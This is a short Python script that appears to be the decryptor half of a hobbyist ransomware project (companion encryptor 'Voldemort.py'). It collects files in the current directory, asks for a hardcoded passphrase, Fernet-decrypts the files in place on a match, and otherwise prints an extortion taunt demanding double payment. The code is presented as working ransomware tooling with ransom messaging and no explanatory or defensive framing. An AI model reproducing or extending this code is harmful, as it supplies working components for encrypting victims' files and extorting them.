#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

#Finding Files

files = []

for file in os.listdir():
        if file == "Voldemort.py" or file == "thekey.key" or file == "Decrypt.py":
                continue
        if os.path.isfile(file):
                files.append(file)

print(files)

with open("thekey.key", "rb") as key:
        secretkey = key.read()

secretphrase = "Lucifer"

user_phrase = input("Enter the secret key to decrypt your files\n")

if user_phrase == secretphrase:
        for file in files:
                with open(file, "rb") as thefile:
                        contents = thefile.read()
                contents_decrypted = Fernet(secretkey). decrypt(contents)
                with open(file, "wb") as thefile:
                        thefile.write(contents_decrypted)
        print("Congrats, your files have been decrypted,\nIt was fun dealing with ya'")

else:
        print("Wrong Key, now you'll have to pay Double amount!!")
